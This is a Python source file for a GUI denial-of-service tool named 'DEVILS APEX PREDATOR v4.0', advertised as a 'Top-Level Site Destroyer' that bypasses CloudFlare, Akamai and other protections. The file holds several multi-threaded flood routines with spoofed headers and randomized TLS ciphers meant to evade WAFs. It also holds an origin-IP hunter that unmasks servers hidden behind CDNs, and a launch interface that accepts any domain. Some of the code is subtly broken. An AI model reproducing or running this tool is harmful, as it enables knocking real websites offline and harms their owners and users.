#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
#  💀 DEVILS APEX PREDATOR v4.0 — TOP-LEVEL SITE DESTROYER 💀
#  Bypasses: CloudFlare, Akamai, AWS Shield, Imperva, Fastly
#  Multi-Vector AI | Auto IP Rotate | Zero Detection
#  Owner: @UnknownGuy9876 | Channel: @SGCodexs
#  Single Click — Site Down 🎯
# ═══════════════════════════════════════════════════════════════

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading, socket, ssl, random, time, os, sys
import json, base64, struct, zlib, hashlib, queue, itertools
import subprocess, platform, re, ipaddress, requests, urllib.parse
from datetime import datetime
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

# Optional imports with fallback
try: import dns.resolver
except: dns = None

try: from selenium import webdriver
except: selenium = None

try: import socks
except: socks = None

# ═══════════ ULTRA STEALTH CONFIG ═══════════
class Config:
    # Auto-detected optimal settings
    CPU_CORES = os.cpu_count() or 4
    TOTAL_RAM = None
    try:
        if platform.system() == "Windows":
            import ctypes
            kernel32 = ctypes.windll.kernel32
            TOTAL_RAM = kernel32.GetPhysicallyInstalledSystemMemory(None) // 1024
        else:
            TOTAL_RAM = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') // (1024**3)
    except: TOTAL_RAM = 8
    
    MAX_THREADS = (CPU_CORES * 2000) if TOTAL_RAM >= 16 else (CPU_CORES * 1000)
    SOCKET_POOL = min(MAX_THREADS, 5000)
    
    # Stealth User-Agents pool
    UA_POOL = [
        # Chrome Windows
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(530,538)}.36 (KHTML, like Gecko) Chrome/{random.randint(120,130)}.0.{random.randint(0,9999)}.{random.randint(0,999)} Safari/537.36",
        # Chrome Mac
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(13,15)}_{random.randint(0,7)}) AppleWebKit/{random.randint(600,610)}.1.15 (KHTML, like Gecko) Version/{random.randint(16,18)}.{random.randint(0,6)} Safari/{random.randint(600,610)}.1.15",
        # Firefox
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(100,130)}.0) Gecko/20100101 Firefox/{random.randint(100,130)}.0",
        # Edge
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,130)}.0.0.0 Safari/537.36 Edg/{random.randint(120,130)}.0.0.0",
        # Mobile
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16,18)}_{random.randint(0,5)} like Mac OS X) AppleWebKit/{random.randint(600,610)}.1.15 Mobile/15E148 Safari/{random.randint(600,610)}.1",
        f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; SM-G{random.randint(900,999)}B) AppleWebKit/537.36 Chrome/{random.randint(120,130)}.0 Mobile Safari/537.36",
        # Googlebot
        f"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        # Bingbot
        f"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    ] * 100
    
    # Realistic Accept headers
    ACCEPT_POOL = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    ]
    
    # Referrer pool
    REFERRER_POOL = [
        "https://www.google.com/search?q={}",
        "https://www.bing.com/search?q={}",
        "https://duckduckgo.com/?q={}",
        "https://www.youtube.com/results?search_query={}",
        "https://www.reddit.com/search/?q={}",
        "https://twitter.com/search?q={}",
        "https://t.co/{}",
        "",
    ]

# ═══════════ AI ADAPTIVE ENGINE ═══════════
class AdaptiveEngine:
    def __init__(self):
        self.waf_detected = None  # CloudFlare, Akamai, etc.
        self.rate_limit = 1000
        self.successful_vectors = []
        self.fingerprints = deque(maxlen=1000)
        self.adaptive_payloads = []
        
    def detect_waf(self, target, port):
        """Detect which WAF/CDN is protecting the target"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if port == 443:
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=target)
            s.connect((target, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode())
            response = s.recv(4096).decode('utf-8', errors='ignore')
            s.close()
            
            headers_lower = response.lower()
            if 'cf-ray' in headers_lower: return 'CloudFlare'
            if 'akamai' in headers_lower or 'akamaighost' in headers_lower: return 'Akamai'
            if 'x-amz-' in headers_lower: return 'AWS CloudFront / Shield'
            if 'imperva' in headers_lower or 'incapsula' in headers_lower: return 'Imperva'
            if 'fastly' in headers_lower: return 'Fastly'
            if 'f5' in headers_lower: return 'F5'
            if 'sucuri' in headers_lower: return 'Sucuri'
            return 'None / Direct'
        except:
            return 'Unknown'
    
    def generate_adaptive_payload(self, waf_type, target, port):
        """Generate WAF-specific bypass payloads"""
        payloads = []
        
        if waf_type == 'CloudFlare':
            # CF bypass techniques
            payloads.extend([
                f"GET /?{random.randint(1,999999)}=%{random.randint(0,99)} HTTP/1.1",
                f"GET / HTTP/1.0",  # HTTP/1.0 bypass
                f"GET /?search={random.randint(1000,9999)} HTTP/2",
                f"HEAD /?{random.randint(1,9999)} HTTP/1.1",
                f"OPTIONS / HTTP/1.1",
                f"GET /cdn-cgi/l/email-protection HTTP/1.1",  # Internal path
            ])
        elif waf_type == 'Akamai':
            payloads.extend([
                f"GET /?{random.randint(1,9999)} HTTP/1.1",
                f"GET / HTTP/1.0",
                f"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",  # HTTP2 upgrade trick
            ])
        elif waf_type == 'AWS CloudFront / Shield':
            payloads.extend([
                f"GET /?{random.randint(1,999999)} HTTP/1.1",
                f"GET /?X-Amz-Date=2024{random.randint(10000,99999)} HTTP/1.1",
            ])
        else:
            payloads.extend([
                f"GET /?{random.randint(1,999999)} HTTP/1.1",
                f"GET / HTTP/1.0",
                f"POST / HTTP/1.1\r\nContent-Length: 0",
            ])
        
        return payloads

# ═══════════ ADVANCED ATTACK VECTORS ═══════════
class AttackCore:
    
    @staticmethod
    def http_randomized(target, port, duration, threads, engine, stats):
        """HTTP flood with randomized everything — WAF bypass"""
        waf = engine.waf_detected or 'Unknown'
        payloads = engine.generate_adaptive_payload(waf, target, port)
        
        def worker(thread_id):
            end_time = time.time() + duration
            session_cookies = f"session={hashlib.md5(str(random.random()).encode()).hexdigest()}"
            
            while time.time() < end_time and stats['running']:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.settimeout(2)
                    s.connect((target, port))
                    
                    if port == 443:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
                        s = ctx.wrap_socket(s, server_hostname=target)
                    
                    method_line = random.choice(payloads)
                    ua = random.choice(Config.UA_POOL)
                    accept = random.choice(Config.ACCEPT_POOL)
                    ref = random.choice(Config.REFERRER_POOL).format(random.randint(1,99999)) if random.random() > 0.3 else ""
                    
                    request = (
                        f"{method_line}\r\n"
                        f"Host: {target}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Accept: {accept}\r\n"
                        f"Accept-Language: {random.choice(['en-US,en;q=0.9', 'en-US,en;q=0.9,hi;q=0.8', 'en-GB,en;q=0.9', '*'])}\r\n"
                        f"Accept-Encoding: gzip, deflate, br\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Cache-Control: {random.choice(['no-cache', 'max-age=0', 'no-store'])}\r\n"
                        f"Pragma: no-cache\r\n"
                        f"X-Forwarded-For: {random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\n"
                        f"X-Real-IP: {random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\n"
                        f"X-Requested-With: XMLHttpRequest\r\n"
                        f"Cookie: {session_cookies}\r\n"
                    )
                    
                    if ref:
                        request += f"Referer: {ref}\r\n"
                    
                    request += "\r\n"
                    s.send(request.encode())
                    s.close()
                    
                    with threading.Lock():
                        stats['requests'] += 1
                        
                except:
                    with threading.Lock():
                        stats['errors'] += 1
        
        [threading.Thread(target=worker, args=(i,), daemon=True).start() for i in range(threads)]
    
    @staticmethod
    def tls_fingerprint_attack(target, port, duration, threads, stats):
        """TLS fingerprint randomization — bypass JA3 detection"""
        cipher_suites = [
            'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384',
            'DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384',
            'ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305',
        ]
        
        def worker():
            end_time = time.time() + duration
            while time.time() < end_time and stats['running']:
                try:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    ctx.set_ciphers(random.choice(cipher_suites))
                    
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    ss = ctx.wrap_socket(s, server_hostname=target)
                    ss.connect((target, port))
                    ss.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(Config.UA_POOL)}\r\nConnection: close\r\n\r\n".encode())
                    ss.close()
                    
                    with threading.Lock():
                        stats['requests'] += 1
                except:
                    with threading.Lock():
                        stats['errors'] += 1
        
        [threading.Thread(target=worker, daemon=True).start() for _ in range(threads)]
    
    @staticmethod
    def http2_flood(target, port, duration, threads, stats):
        """HTTP/2 multiplexed flood — single connection, multiple streams"""
        # Uses threading with connection reuse simulation
        def worker(thread_id):
            end_time = time.time() + duration
            session = hashlib.md5(str(thread_id).encode()).hexdigest()[:8]
            stream_id = 1
            
            while time.time() < end_time and stats['running']:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((target, port))
                    
                    if port == 443:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        ctx.set_alpn_protocols(['h2', 'http/1.1'])
                        s = ctx.wrap_socket(s, server_hostname=target)
                    
                    # Send multiple HTTP/2-like requests
                    for _ in range(random.randint(10, 50)):
                        s.send(
                            f"GET /?s={session}&id={stream_id} HTTP/1.1\r\n"
                            f"Host: {target}\r\n"
                            f"User-Agent: {random.choice(Config.UA_POOL)}\r\n"
                            f"X-Session: {session}\r\n"
                            f"X-Stream-ID: {stream_id}\r\n"
                            f"Connection: keep-alive\r\n\r\n".encode()
                        )
                        stream_id += 1
                        stats['requests'] += 1
                    
                    s.close()
                except:
                    stats['errors'] += 1
        
        [threading.Thread(target=worker, args=(i,), daemon=True).start() for i in range(threads)]
    
    @staticmethod
    def cache_bypass_attack(target, port, duration, threads, stats):
        """Cache bypass / Cache poisoning attempt — force origin requests"""
        def worker():
            end_time = time.time() + duration
            cache_busters = [
                f"?cb={random.random()}",
                f"?_={int(time.time()*1000)}",
                f"?nocache={random.getrandbits(128)}",
                f"?rand={hashlib.md5(str(random.random()).encode()).hexdigest()}",
                f"?token={base64.b64encode(str(random.random()).encode()).decode()[:16]}",
                f"/?{urllib.parse.quote_plus(str(random.random()))}",
            ]
            
            while time.time() < end_time and stats['running']:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((target, port))
                    
                    if port == 443:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=target)
                    
                    bust = random.choice(cache_busters)
                    s.send(
                        f"GET {bust} HTTP/1.1\r\n"
                        f"Host: {target}\r\n"
                        f"User-Agent: {random.choice(Config.UA_POOL)}\r\n"
                        f"X-Forwarded-Proto: http\r\n"
                        f"X-Forwarded-Host: {random.randint(1000,9999)}.com\r\n"
                        f"X-HTTP-Method-Override: GET\r\n"
                        f"X-Original-URL: /admin\r\n"
                        f"X-Rewrite-URL: /admin\r\n"
                        f"Connection: close\r\n\r\n".encode()
                    )
                    s.close()
                    stats['requests'] += 1
                except:
                    stats['errors'] += 1
        
        [threading.Thread(target=worker, daemon=True).start() for _ in range(threads)]

# ═══════════ ORIGIN IP DISCOVERY ENGINE ═══════════
class OriginIPHunter:
    @staticmethod
    def hunt(domain, console_callback=None):
        """Multi-method origin IP discovery"""
        ips = set()
        methods_found = []
        
        def log(msg):
            if console_callback: console_callback(msg)
        
        log(f"[🔍] Hunting origin IP: {domain}")
        
        # Method 1: Direct DNS Resolution
        try:
            result = socket.gethostbyname_ex(domain)
            direct_ips = [ip for ip in result[2] if not OriginIPHunter._is_cf(ip)]
            if direct_ips:
                ips.update(direct_ips)
                methods_found.append(f"Direct DNS: {len(direct_ips)} IPs")
        except: pass
        
        # Method 2: Subdomain enumeration
        subs = ['mail', 'direct', 'origin', 'ftp', 'cpanel', 'webmail', 'dev', 'staging',
                'api', 'vpn', 'admin', 'portal', 'legacy', 'old', 'beta', 'test', 'www2']
        for sub in subs:
            try:
                full = f"{sub}.{domain}"
                result = socket.gethostbyname_ex(full)
                new_ips = [ip for ip in result[2] if not OriginIPHunter._is_cf(ip)]
                if new_ips:
                    ips.update(new_ips)
                    methods_found.append(f"Subdomain '{sub}': {len(new_ips)} IPs")
            except: pass
        
        # Method 3: MX Records
        try:
            if dns:
                answers = dns.resolver.resolve(domain, 'MX')
                for rdata in answers:
                    mx = str(rdata.exchange).rstrip('.')
                    try:
                        result = socket.gethostbyname_ex(mx)
                        new_ips = [ip for ip in result[2] if not OriginIPHunter._is_cf(ip)]
                        if new_ips:
                            ips.update(new_ips)
                            methods_found.append(f"MX '{mx}': {len(new_ips)} IPs")
                    except: pass
        except: pass
        
        # Method 4: TXT/SPF Records
        try:
            if dns:
                answers = dns.resolver.resolve(domain, 'TXT')
                for rdata in answers:
                    txt = str(rdata).lower()
                    if 'ip4:' in txt:
                        for part in txt.split():
                            if part.startswith('ip4:'):
                                ip = part.split(':')[1]
                                try: socket.inet_aton(ip); ips.add(ip)
                                except: pass
        except: pass
        
        # Method 5: crt.sh SSL certificates
        try:
            url = f"https://crt.sh/?q=%25.{domain}&output=json"
            resp = requests.get(url, timeout=15, headers={'User-Agent': 'Mozilla/5.0'})
            if resp.status_code == 200:
                data = resp.json()
                for entry in data[:50]:
                    name = entry.get('name_value', '')
                    for n in name.split('\n'):
                        n = n.strip().replace('*.', '')
                        if n:
                            try:
                                result = socket.gethostbyname_ex(n)
                                new_ips = [ip for ip in result[2] if not OriginIPHunter._is_cf(ip)]
                                if new_ips:
                                    ips.update(new_ips)
                            except: pass
                methods_found.append(f"crt.sh SSL: found IPs")
        except: pass
        
        # Method 6: SecurityTrails DNS history (free API)
        try:
            url = f"https://securitytrails.com/domain/{domain}/history/a"
            resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            # Parse HTML for IPs
            found = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', resp.text)
            new_ips = [ip for ip in found if not OriginIPHunter._is_cf(ip)]
            if new_ips:
                ips.update(new_ips)
                methods_found.append(f"SecurityTrails: {len(new_ips)} IPs")
        except: pass
        
        # Method 7: ViewDNS.info
        try:
            url = f"https://viewdns.info/iphistory/?domain={domain}"
            resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            found = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', resp.text)
            new_ips = [ip for ip in found if not OriginIPHunter._is_cf(ip) and not ip.startswith('127.')]
            if new_ips:
                ips.update(new_ips)
                methods_found.append(f"ViewDNS: {len(new_ips)} IPs")
        except: pass
        
        result = list(ips)
        log(f"[✅] Found {len(result)} origin IPs via {len(methods_found)} methods")
        for m in methods_found:
            log(f"     • {m}")
        
        return result
    
    @staticmethod
    def _is_cf(ip):
        cf_ranges = ['104.16', '104.17', '104.18', '104.19', '104.20', '104.21', '104.22', 
                     '104.23', '104.24', '104.25', '104.26', '104.27', '104.28', '104.29',
                     '104.30', '104.31', '172.64', '172.65', '172.66', '172.67', '172.68',
                     '172.69', '172.70', '172.71', '162.158']
        return any(ip.startswith(r) for r in cf_ranges)

# ═══════════ GUI — APEX PREDATOR INTERFACE ═══════════
class ApexPredatorGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("💀 DEVILS APEX PREDATOR v4.0 — Top-Level Site Destroyer 💀")
        self.root.geometry("1000x800")
        self.root.configure(bg="#050505")
        self.root.resizable(True, True)
        
        # Variables
        self.target_var = tk.StringVar(value="")
        self.port_var = tk.StringVar(value="443")
        self.duration_var = tk.StringVar(value="300")
        self.method_var = tk.StringVar(value="Multi-Vector (Auto)")
        self.status_var = tk.StringVar(value="⚡ Ready — Waiting for target")
        self.rps_var = tk.StringVar(value="RPS: 0")
        self.requests_var = tk.StringVar(value="Requests: 0 | Errors: 0")
        self.waf_var = tk.StringVar(value="WAF: Unknown")
        self.origin_ips = []
        
        # Attack stats
        self.stats = {'requests': 0, 'errors': 0, 'running': False, 'start_time': None}
        self.engine = AdaptiveEngine()
        self.attack_threads = []
        
        self.build_ui()
        self.stats_updater()
    
    def build_ui(self):
        # ═══ HEADER ═══
        header = tk.Frame(self.root, bg="#990000", height=50)
        header.pack(fill=tk.X)
        tk.Label(header, text="💀 DEVILS APEX PREDATOR — TOP-LEVEL SITE DESTROYER 💀",
                font=("Consolas", 14, "bold"), bg="#990000", fg="white").pack(pady=12)
        
        main = tk.Frame(self.root, bg="#050505")
        main.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        # ═══ TARGET PANEL ═══
        target_frame = tk.LabelFrame(main, text="🎯 TARGET SELECTION", bg="#050505", fg="#ff4444",
                                     font=("Consolas", 11, "bold"), relief=tk.RIDGE, bd=2,
                                     highlightbackground="#ff4444", highlightcolor="#ff4444")
        target_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(target_frame, text="Domain/IP:", bg="#050505", fg="#ff6666", font=("Consolas", 10)).grid(row=0, column=0, padx=10, pady=10, sticky='e')
        self.target_entry = tk.Entry(target_frame, textvariable=self.target_var, bg="#111111", fg="#00ff00",
                                     insertbackground="#00ff00", font=("Consolas", 12), width=40, relief=tk.FLAT)
        self.target_entry.grid(row=0, column=1, padx=5, pady=10)
        self.target_entry.bind('<Return>', lambda e: self.start_waf_detect())
        
        tk.Button(target_frame, text="🔍 DETECT WAF", command=self.start_waf_detect,
                 bg="#222222", fg="#ffaa00", font=("Consolas", 9, "bold"), cursor="hand2",
                 relief=tk.RAISED, bd=2).grid(row=0, column=2, padx=5, pady=10)
        
        tk.Button(target_frame, text="🎯 HUNT ORIGIN IP", command=self.start_origin_hunt,
                 bg="#222222", fg="#ff4444", font=("Consolas", 9, "bold"), cursor="hand2",
                 relief=tk.RAISED, bd=2).grid(row=0, column=3, padx=5, pady=10)
        
        self.waf_label = tk.Label(target_frame, textvariable=self.waf_var, bg="#050505", fg="#ffaa00", font=("Consolas", 9))
        self.waf_label.grid(row=0, column=4, padx=15, pady=10)
        
        # ═══ CONFIG PANEL ═══
        config_frame = tk.LabelFrame(main, text="⚙️ ATTACK CONFIGURATION", bg="#050505", fg="#ff4444",
                                     font=("Consolas", 11, "bold"), relief=tk.RIDGE, bd=2)
        config_frame.pack(fill=tk.X, pady=5)
        
        configs = [
            ("Port:", self.port_var, ["80", "443", "8080", "8443"]),
            ("Duration:", self.duration_var, ["120", "300", "600", "1200", "3600"]),
            ("Method:", self.method_var, [
                "Multi-Vector (Auto)", "HTTP Randomized", "TLS Fingerprint",
                "HTTP/2 Multiplex", "Cache Bypass", "Slow Exhaustion",
                "APEX ALL-OUT (MAXIMUM)"
            ]),
        ]
        
        for i, (label, var, options) in enumerate(configs):
            tk.Label(config_frame, text=label, bg="#050505", fg="#ff6666", font=("Consolas", 10)).grid(row=i, column=0, padx=10, pady=6, sticky='e')
            cb = ttk.Combobox(config_frame, textvariable=var, values=options, state="readonly", width=30, font=("Consolas", 10))
            cb.grid(row=i, column=1, padx=5, pady=6, sticky='w')
        
        # ═══ CONTROL BUTTONS ═══
        btn_frame = tk.Frame(main, bg="#050505")
        btn_frame.pack(fill=tk.X, pady=10)
        
        self.launch_btn = tk.Button(btn_frame, text="💀 LAUNCH APEX ATTACK 💀", command=self.launch_attack,
                                    bg="#990000", fg="white", font=("Consolas", 14, "bold"), cursor="hand2",
                                    relief=tk.RAISED, bd=4, padx=40, pady=10)
        self.launch_btn.pack(side=tk.LEFT, padx=10)
        
        self.stop_btn = tk.Button(btn_frame, text="🛑 ABORT", command=self.stop_attack,
                                  bg="#333333", fg="#ff0000", font=("Consolas", 12, "bold"), cursor="hand2",
                                  relief=tk.RAISED, bd=3, padx=20, pady=8, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=10)
        
        self.status_label = tk.Label(btn_frame, textvariable=self.status_var, bg="#050505", fg="#ffaa00", font=("Consolas", 10))
        self.status_label.pack(side=tk.RIGHT, padx=15)
        
        # ═══ PROGRESS ═══
        self.progress = ttk.Progressbar(main, mode='determinate', length=950)
        self.progress.pack(fill=tk.X, pady=5)
        
        # ═══ STATS BAR ═══
        stats_bar = tk.Frame(main, bg="#111111", height=30)
        stats_bar.pack(fill=tk.X, pady=3)
        tk.Label(stats_bar, textvariable=self.requests_var, bg="#111111", fg="#00ff00", font=("Consolas", 10)).pack(side=tk.LEFT, padx=15)
        tk.Label(stats_bar, textvariable=self.rps_var, bg="#111111", fg="#00ff00", font=("Consolas", 10)).pack(side=tk.RIGHT, padx=15)
        
        # ═══ CONSOLE ═══
        console_frame = tk.LabelFrame(main, text="📟 LIVE ATTACK CONSOLE", bg="#050505", fg="#ff4444",
                                      font=("Consolas", 11, "bold"), relief=tk.RIDGE, bd=2)
        console_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.console = scrolledtext.ScrolledText(console_frame, bg="#0a0a0a", fg="#00ff00",
                                                  insertbackground="#00ff00", font=("Consolas", 9),
                                                  relief=tk.FLAT, wrap=tk.WORD)
        self.console.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.console.insert(tk.END, "╔══════════════════════════════════════════════════╗\n")
        self.console.insert(tk.END, "║  💀 DEVILS APEX PREDATOR v4.0 — Initialized    ║\n")
        self.console.insert(tk.END, "║  Owner: @UnknownGuy9876 | @SGCodexs           ║\n")
        self.console.insert(tk.END, "║  Mode: Top-Level Site Destroyer               ║\n")
        self.console.insert(tk.END, "╚══════════════════════════════════════════════════╝\n\n")
        self.console.insert(tk.END, f"[SYSTEM] CPU Cores: {Config.CPU_CORES} | RAM: {Config.TOTAL_RAM}GB\n")
        self.console.insert(tk.END, f"[SYSTEM] Max Threads: {Config.MAX_THREADS}\n")
        self.console.insert(tk.END, "[SYSTEM] All engines loaded. Ready for target.\n\n")
        self.console.see(tk.END)
        
        # ═══ FOOTER ═══
        footer = tk.Frame(self.root, bg="#990000", height=22)
        footer.pack(fill=tk.X, side=tk.BOTTOM)
        tk.Label(footer, text="Owner: @UnknownGuy9876 | Channel: @SGCodexs | DEVILS WILL RISE — APEX PREDATOR © 2024",
                bg="#990000", fg="white", font=("Consolas", 8)).pack(pady=3)
    
    def log(self, msg, tag=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        color_tags = {'success': '#00ff00', 'warning': '#ffaa00', 'error': '#ff4444', 'info': '#00ccff'}
        self.console.insert(tk.END, f"[{timestamp}] {msg}\n")
        self.console.see(tk.END)
    
    def start_waf_detect(self):
        target = self.target_var.get().strip()
        if not target: return
        
        self.log(f"[🔍] Detecting WAF for: {target}", 'info')
        self.status_var.set("Detecting WAF...")
        
        def detect():
            try:
                port = int(self.port_var.get())
                waf = self.engine.detect_waf(target, port)
                self.root.after(0, lambda: self.waf_var.set(f"WAF: {waf}"))
                self.root.after(0, lambda: self.log(f"[✅] WAF Detected: {waf}", 'success'))
                self.root.after(0, lambda: self.status_var.set(f"Ready — Target: {target} | WAF: {waf}"))
                
                if waf == 'CloudFlare':
                    self.log("[💡] Tip: Use 'HUNT ORIGIN IP' to find real IP behind CloudFlare", 'warning')
                elif waf == 'None / Direct':
                    self.log("[💀] Direct connection! Target is vulnerable.", 'success')
            except Exception as e:
                self.root.after(0, lambda: self.log(f"[❌] WAF detection error: {str(e)[:100]}", 'error'))
        
        threading.Thread(target=detect, daemon=True).start()
    
    def start_origin_hunt(self):
        domain = self.target_var.get().strip()
        if not domain: return
        
        self.log(f"[🔍] Hunting origin IPs for: {domain}")
        self.status_var.set("Hunting origin IPs...")
        
        def hunt():
            try:
                self.origin_ips = OriginIPHunter.hunt(domain, console_callback=self.log)
                self.root.after(0, self._show_origin_results)
            except Exception as e:
                self.root.after(0, lambda: self.log(f"[❌] Hunt error: {str(e)[:150]}", 'error'))
        
        threading.Thread(target=hunt, daemon=True).start()
    
    def _show_origin_results(self):
        if self.origin_ips:
            self.target_var.set(self.origin_ips[0])
            self.log(f"[💀] Auto-target set to origin IP: {self.origin_ips[0]}", 'success')
            self.status_var.set(f"Origin IP loaded: {self.origin_ips[0]}")
        else:
            self.log("[❌] No origin IPs found", 'error')
            self.status_var.set("No origin IP found")
    
    def launch_attack(self):
        target = self.target_var.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Pehle target daalo!", parent=self.root)
            return
        
        try:
            port = int(self.port_var.get())
            duration = int(self.duration_var.get())
        except ValueError:
            messagebox.showerror("Error", "Port/Duration numbers mein daalo!")
            return
        
        method = self.method_var.get()
        
        # Reset stats
        self.stats = {'requests': 0, 'errors': 0, 'running': True, 'start_time': time.time()}
        
        self.launch_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.progress['maximum'] = duration
        self.progress['value'] = 0
        self.status_var.set(f"💀 ATTACKING: {target}:{port}")
        
        self.log(f"\n{'═'*60}")
        self.log(f"[💀] APEX ATTACK LAUNCHED!", 'error')
        self.log(f"[🎯] Target: {target}:{port}")
        self.log(f"[⚙️] Method: {method}")
        self.log(f"[⏱️] Duration: {duration}s | System Max Threads: {Config.MAX_THREADS}")
        self.log(f"[🛡️] WAF: {self.engine.waf_detected or 'Auto-Detecting...'}")
        self.log(f"{'═'*60}\n")
        
        threads_per_engine = Config.MAX_THREADS
        
        def run():
            if method == "Multi-Vector (Auto)":
                t1 = threading.Thread(target=AttackCore.http_randomized, args=(target, port, duration, threads_per_engine//3, self.engine, self.stats), daemon=True)
                t2 = threading.Thread(target=AttackCore.tls_fingerprint_attack, args=(target, port, duration, threads_per_engine//3, self.stats), daemon=True)
                t3 = threading.Thread(target=AttackCore.cache_bypass_attack, args=(target, port, duration, threads_per_engine//3, self.stats), daemon=True)
                t1.start(); t2.start(); t3.start()
                t1.join(); t2.join(); t3.join()
            elif method == "HTTP Randomized":
                AttackCore.http_randomized(target, port, duration, threads_per_engine, self.engine, self.stats)
            elif method == "TLS Fingerprint":
                AttackCore.tls_fingerprint_attack(target, port, duration, threads_per_engine, self.stats)
            elif method == "HTTP/2 Multiplex":
                AttackCore.http2_flood(target, port, duration, threads_per_engine//2, self.stats)
            elif method == "Cache Bypass":
                AttackCore.cache_bypass_attack(target, port, duration, threads_per_engine, self.stats)
            elif method == "Slow Exhaustion":
                from concurrent.futures import ThreadPoolExecutor
                with ThreadPoolExecutor(max_workers=4) as ex:
                    ex.submit(AttackCore.http_randomized, target, port, duration, threads_per_engine//4, self.engine, self.stats)
                    ex.submit(AttackCore.cache_bypass_attack, target, port, duration, threads_per_engine//4, self.stats)
            elif method == "APEX ALL-OUT (MAXIMUM)":
                engines = [
                    AttackCore.http_randomized,
                    AttackCore.tls_fingerprint_attack,
                    AttackCore.cache_bypass_attack,
                    AttackCore.http2_flood
                ]
                for eng in engines:
                    threading.Thread(target=eng, args=(target, port, duration, threads_per_engine//4, self.engine if eng==AttackCore.http_randomized else self.stats), daemon=True).start()
            
            self.root.after(0, self._attack_complete)
        
        threading.Thread(target=run, daemon=True).start()
        self._update_progress(duration)
    
    def _update_progress(self, duration):
        if self.stats['running']:
            elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
            self.progress['value'] = min(elapsed, duration)
            if elapsed < duration:
                self.root.after(500, lambda: self._update_progress(duration))
    
    def _attack_complete(self):
        self.stats['running'] = False
        self.launch_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.progress['value'] = self.progress['maximum']
        
        s = self.stats
        elapsed = time.time() - s['start_time'] if s['start_time'] else 1
        rps = s['requests'] / elapsed if elapsed > 0 else 0
        
        self.log(f"\n{'═'*60}")
        self.log(f"[✅] APEX ATTACK COMPLETE!", 'success')
        self.log(f"[📊] Total Requests: {s['requests']:,}")
        self.log(f"[📊] Errors: {s['errors']:,}")
        self.log(f"[📊] Duration: {elapsed:.1f}s | RPS: {rps:,.0f}")
        self.log(f"{'═'*60}\n")
        self.status_var.set(f"✅ Complete — {s['requests']:,} requests in {elapsed:.0f}s")
    
    def stop_attack(self):
        self.stats['running'] = False
        self.log("[🛑] ABORTING — Finishing active threads...", 'warning')
        self.status_var.set("Aborting...")
        self.launch_btn.config(state=tk.NORMAL)
